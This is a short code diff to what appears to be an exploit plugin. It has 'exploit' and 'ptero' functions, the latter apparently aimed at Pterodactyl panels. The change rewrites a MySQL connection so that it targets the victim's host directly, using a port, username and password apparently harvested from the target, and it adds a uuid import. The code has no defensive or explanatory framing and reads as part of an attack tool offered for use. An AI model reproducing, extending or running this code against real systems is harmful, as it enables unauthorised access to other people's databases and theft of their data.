@@ -7,6 +7,7 @@ import requests
 from requests.exceptions import RequestException
 from plugins.common import *
 import string
+import uuid
 
 def exploit(target_url):
     warnings.filterwarnings("ignore", category=UserWarning)
@@ -57,7 +58,7 @@ def ptero(target_url):
 
     try:
         conn = mysql.connector.connect(
-            host=data['host'],
+            host=str(target_url).replace('https://', '').replace('http://', '').replace('/', ''),
             port=int(data['port']),
             user=data['username'],
             password=data['password'],
